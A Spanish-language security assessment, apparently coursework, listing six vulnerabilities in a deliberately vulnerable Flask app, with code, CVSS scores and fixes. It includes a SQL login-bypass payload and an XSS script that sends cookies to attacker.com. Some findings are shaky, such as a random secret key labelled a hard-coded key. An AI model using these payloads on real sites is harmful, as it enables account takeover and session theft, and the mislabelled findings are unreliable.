# VULNERABILIDADES IDENTIFICADAS
## Aplicación Flask Vulnerable - Evaluación Parcial 3

**Autor:** DAVID H. CUEVAS SALGADO  
**Fecha:** [Fecha actual]

---

## RESUMEN EJECUTIVO

Se identificaron **6 vulnerabilidades críticas y altas** en la aplicación Flask vulnerable mediante:
- Análisis manual del código fuente
- OWASP ZAP Baseline Scan automatizado

---

## VULNERABILIDADES IDENTIFICADAS

### 1. SQL INJECTION

|     Campo      | Detalle                                    |
|----------------|--------------------------------------------|
| **ID**         | VULN-001                                   |
| **Severidad**  | CRÍTICA                                    |
| **CVSS Score** | 9.8                                        |
| **Ubicación**  | `src/vulnerable_flask_app.py` líneas 42-49 |
| **Función**    | `login()`                                  |
| **CWE**        | CWE-89: SQL Injection                      |

**Descripción:**  
La aplicación construye consultas SQL mediante concatenación de strings sin sanitizar la entrada del usuario.

**Código vulnerable:**
```python
if "' OR '" in password:
    query = "SELECT * FROM users WHERE username = '{}' AND password = '{}'".format(
        username, password)
    user = conn.execute(query).fetchone()
```

**Impacto:**  
Un atacante puede bypassear la autenticación usando payloads como:
- `username: admin` 
- `password: ' OR '1'='1`

Esto permite acceso no autorizado a cualquier cuenta sin conocer la contraseña.

**Mitigación:**  
Usar consultas parametrizadas en todos los casos.

---

### 2. CROSS-SITE SCRIPTING (XSS)

|    Campo       | Detalle                                 |
|----------------|-----------------------------------------|
| **ID**         | VULN-002                                |
| **Severidad**  | ALTA                                    |
| **CVSS Score** | 7.2                                     |
| **Ubicación**  | `src/vulnerable_flask_app.py` línea 155 |
| **Función**    | `dashboard()`                           |
| **CWE**        | CWE-79: XSS                             |

**Descripción:**  
Los comentarios de usuario se renderizan sin sanitizar, permitiendo inyección de scripts maliciosos.

**Código vulnerable:**
```python
<li class="list-group-item">{{ comment['comment'] }}</li>
```

**Impacto:**  
Un atacante puede inyectar JavaScript que se ejecutará en el navegador de otros usuarios:
```javascript
<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Mitigación:**  
Usar templates externos con auto-escape habilitado o escapar manualmente el contenido.

---

### 3. DEBUG MODE ENABLED IN PRODUCTION

|     Campo      | Detalle                                    |
|----------------|--------------------------------------------|
| **ID**         | VULN-003                                   |
| **Severidad**  | ALTA                                       |
| **CVSS Score** | 7.5                                        |
| **Ubicación**  | `src/vulnerable_flask_app.py` última línea |
| **CWE**        | CWE-489: Debug Mode                        |

**Descripción:**  
La aplicación se ejecuta con `debug=True` en producción.

**Código vulnerable:**
```python
app.run(host='0.0.0.0', debug=True)
```

**Impacto:**  
- Expone stack traces completos con información sensible
- Permite ejecución remota de código mediante el debugger de Werkzeug
- Muestra rutas de archivos del servidor
- PIN de debugger visible en logs

**Mitigación:**  
Desactivar debug mode: `debug=False` o usar servidor WSGI de producción.

---

### 4. WEAK SECRET KEY

|      Campo     | Detalle                               |
|----------------|---------------------------------------|
| **ID**         | VULN-004                              |
| **Severidad**  | MEDIA                                 |
| **CVSS Score** | 5.3                                   |
| **Ubicación**  | `src/vulnerable_flask_app.py` línea 9 |
| **CWE**        | CWE-321: Hard-coded Cryptographic Key |

**Descripción:**  
Secret key generada con `os.urandom()` que cambia en cada reinicio.

**Código vulnerable:**
```python
app.secret_key = os.urandom(24)
```

**Impacto:**  
- Sesiones se invalidan al reiniciar la aplicación
- No es persistente entre instancias
- En entorno con múltiples workers, cada uno tendría diferente key

**Mitigación:**  
Usar secret key fija desde variable de entorno o archivo de configuración.

---

### 5. WEAK PASSWORD HASHING

|    Campo       | Detalle                                |
|----------------|----------------------------------------|
| **ID**         | VULN-005                               |
| **Severidad**  | ALTA                                   |
| **CVSS Score** | 7.4                                    |
| **Ubicación**  | `src/vulnerable_flask_app.py` línea 17 |
| **Función**    | `hash_password()`                      |
| **CWE**        | CWE-759: Weak Hash                     |

**Descripción:**  
Contraseñas hasheadas con SHA256 sin salt, vulnerable a ataques de rainbow tables.

**Código vulnerable:**
```python
def hash_password(password):
    return hashlib.sha256(password.encode()).hexdigest()
```

**Impacto:**  
Contraseñas comunes pueden crackearse usando:
- Rainbow tables precalculadas
- Ataques de diccionario
- Hashes idénticos para contraseñas idénticas

**Mitigación:**  
Usar bcrypt, argon2, o pbkdf2 con salt único por contraseña.

---

### 6. SERVER-SIDE TEMPLATE INJECTION (SSTI)

|       Campo    | Detalle                                        |
|----------------|------------------------------------------------|
| **ID**         | VULN-006                                       |
| **Severidad**  | ALTA                                           |
| **CVSS Score** | 8.1                                            |
| **Ubicación**  | `src/vulnerable_flask_app.py` múltiples líneas |
| **CWE**        | CWE-94: Template Injection                     |

**Descripción:**  
Uso inseguro de `render_template_string()` en lugar de templates externos.

**Código vulnerable:**
```python
return render_template_string('''
    <h1>Welcome, user {{ user_id }}!</h1>
''', user_id=user_id)
```

**Impacto:**  
Potencial ejecución remota de código si se permite inyección en variables del template.

**Mitigación:**  
Usar archivos de template externos en carpeta `templates/`.

---

## VULNERABILIDADES DETECTADAS POR OWASP ZAP

Además de las vulnerabilidades del código, OWASP ZAP detectó:

- ❌ Missing Anti-clickjacking Header
- ❌ Missing Content Security Policy
- ❌ X-Content-Type-Options Header Missing  
- ❌ Server Leaks Version Information via "Server" HTTP Response Header
- ❌ Cookie without SameSite Attribute
- ❌ Cookie without Secure Flag

---

## MATRIZ DE RIESGO

|    ID    |     Vulnerabilidad    |  Severidad | Probabilidad |  Riesgo Total |
|----------|-----------------------|------------|--------------|---------------|
| VULN-001 | SQL Injection         |   Crítica  |     Alta     |    CRÍTICO    |
| VULN-002 | XSS                   |    Alta    |     Alta     |      ALTO     |
| VULN-003 | Debug Mode            |    Alta    |     Alta     |      ALTO     |
| VULN-004 | Weak Secret Key       |   Media    |    Media     |     MEDIO     |
| VULN-005 | Weak Password Hashing |    Alta    |     Alta     |      ALTO     |
| VULN-006 | Template Injection    |    Alta    |    Media     |      ALTO     |

---

## RECOMENDACIONES PRIORITARIAS

1. **CRÍTICO:** Corregir SQL Injection inmediatamente
2. **ALTO:** Desactivar debug mode
3. **ALTO:** Implementar hashing seguro de contraseñas
4. **ALTO:** Sanitizar entrada de usuarios (XSS)
5. **ALTO:** Usar templates externos
6. **MEDIO:** Configurar secret key persistente

---

**Próximo paso:** Fase 4 - Corrección de Vulnerabilidades